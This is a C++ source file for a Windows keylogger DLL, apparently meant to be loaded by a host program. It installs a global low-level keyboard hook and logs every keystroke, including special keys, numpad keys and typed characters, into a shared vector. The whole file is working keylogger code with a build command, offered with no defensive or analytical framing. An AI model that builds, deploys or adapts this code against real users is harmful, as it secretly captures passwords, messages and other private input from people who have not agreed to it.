//cl /EHsc /LD .\keylog_k_lib.cpp /link User32.lib
#include <Windows.h>
#include <mutex>
#include <codecvt>
#include <string>
#include <vector>
#define DLL_EXPORT __declspec(dllexport)
///////////////////////////////////////////////////////////////////////
HHOOK keyboardHook;
std::vector<std::string>* sharedLogVector = nullptr; // Pointer to the shared vector
std::mutex logMutex;
///////////////////////////////////////////////////////////////////////
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
///////////////////////////////////////////////////////////////////////

DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
{
    sharedLogVector = logVector;
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
}

DLL_EXPORT void Cleanup()
{
    if (keyboardHook) UnhookWindowsHookEx(keyboardHook);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;
        BYTE keyState[256];
        GetKeyboardState(keyState);
        WCHAR outputChar[2] = { 0 };

        {
            std::lock_guard<std::mutex> lock(logMutex);
            switch (wParam) // Switch on wParam (message type)
            {
                case WM_KEYDOWN:
                case WM_SYSKEYDOWN:
                {
                    switch (keyInfo->vkCode)
                    {
                        case VK_LSHIFT:
                        case VK_RSHIFT:
                            sharedLogVector->emplace_back("[Shift Pressed] ");
                            break;
                        case VK_LCONTROL:
                        case VK_RCONTROL:
                            sharedLogVector->emplace_back("[Control]");
                            break;
                        case VK_LMENU:
                        case VK_RMENU:
                            sharedLogVector->emplace_back("[Alt] ");
                            break;
                        case VK_CAPITAL:
                            sharedLogVector->emplace_back("[Caps Lock] ");
                            break;
                        case VK_BACK:
                            sharedLogVector->emplace_back("[Backspace]");
                            break;
                        case VK_TAB:
                            sharedLogVector->emplace_back("[Tab] ");
                            break;
                        case VK_ESCAPE:
                            sharedLogVector->emplace_back("[Escape] ");
                            break;
                        case VK_RETURN:
                            sharedLogVector->emplace_back("[Enter] ");
                            break;
                        case VK_SPACE:
                            sharedLogVector->emplace_back("[Space]");
                            break;
                        case VK_LEFT:
                            sharedLogVector->emplace_back("[<-] ");
                            break;
                        case VK_RIGHT:
                            sharedLogVector->emplace_back("[->] ");
                            break;
                        case VK_UP:
                            sharedLogVector->emplace_back("[Up Arrow] ");
                            break;
                        case VK_DOWN:
                            sharedLogVector->emplace_back("[Down Arrow] ");
                            break;
                        case VK_DELETE:
                            sharedLogVector->emplace_back("[Del] ");
                            break;
                        case VK_INSERT:
                            sharedLogVector->emplace_back("[Ins] ");
                            break;
                        case VK_LWIN:
                        case VK_RWIN:
                            sharedLogVector->emplace_back("[Windows] ");
                            break;
                        case VK_NUMPAD0:
                            sharedLogVector->emplace_back("[NumPad 0] ");
                            break;
                        case VK_NUMPAD1:
                            sharedLogVector->emplace_back("[NumPad 1] ");
                            break;
                        case VK_NUMPAD2:
                            sharedLogVector->emplace_back("[NumPad 2] ");
                            break;
                        case VK_NUMPAD3:
                            sharedLogVector->emplace_back("[NumPad 3] ");
                            break;
                        case VK_NUMPAD4:
                            sharedLogVector->emplace_back("[NumPad 4] ");
                            break;
                        case VK_NUMPAD5:
                            sharedLogVector->emplace_back("[NumPad 5] ");
                            break;
                        case VK_NUMPAD6:
                            sharedLogVector->emplace_back("[NumPad 6] ");
                            break;
                        case VK_NUMPAD7:
                            sharedLogVector->emplace_back("[NumPad 7] ");
                            break;
                        case VK_NUMPAD8:
                            sharedLogVector->emplace_back("[NumPad 8] ");
                            break;
                        case VK_NUMPAD9:
                            sharedLogVector->emplace_back("[NumPad 9] ");
                            break;
                        case VK_MULTIPLY:
                            sharedLogVector->emplace_back("[NumPad Multiply] ");
                            break;
                        case VK_ADD:
                            sharedLogVector->emplace_back("[NumPad Add] ");
                            break;
                        case VK_SEPARATOR:
                            sharedLogVector->emplace_back("[NumPad Separator] ");
                            break;
                        case VK_SUBTRACT:
                            sharedLogVector->emplace_back("[NumPad Subtract] ");
                            break;
                        case VK_DECIMAL:
                            sharedLogVector->emplace_back("[NumPad Decimal] ");
                            break;
                        case VK_DIVIDE:
                            sharedLogVector->emplace_back("[NumPad Divide] ");
                            break;
                        case VK_HOME:
                            sharedLogVector->emplace_back("[Home] ");
                            break;
                        case VK_END:
                            sharedLogVector->emplace_back("[End] ");
                            break;
                        case VK_PRIOR:
                            sharedLogVector->emplace_back("[Pg_up] ");
                            break;
                        case VK_NEXT:
                            sharedLogVector->emplace_back("[Pg_down] ");
                            break;
                        case VK_NUMLOCK:
                            sharedLogVector->emplace_back("[Numlock] ");
                            break;
                        case VK_SNAPSHOT:
                            sharedLogVector->emplace_back("[Print_scr] ");
                            break;
                        default:
                        {
                            int result = ToUnicode(keyInfo->vkCode, keyInfo->scanCode, keyState, outputChar, 1, 0);
                            if (result == 1)
                            {
                                std::string utf8Char(1, (char)outputChar[0]); 
                                sharedLogVector->emplace_back(utf8Char);
                            } else if (result > 1) { 
                                outputChar[result] = L'\0';
                                std::string utf8Char = std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(outputChar);
                                sharedLogVector->emplace_back(utf8Char);
                            } 
                            else sharedLogVector->emplace_back("[unknown] ");
                            
                            break;
                        }
                    }
                    break;
                }
                case WM_KEYUP:
                case WM_SYSKEYUP: // Handle system key ups
                {   
                    switch (keyInfo->vkCode)
                    {
                        case VK_LSHIFT:
                        case VK_RSHIFT:
                        {
                            sharedLogVector->emplace_back("[Shift Released] ");
                            break;
                        }
                    }
                    break;
                }
            }
        }
    }

    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}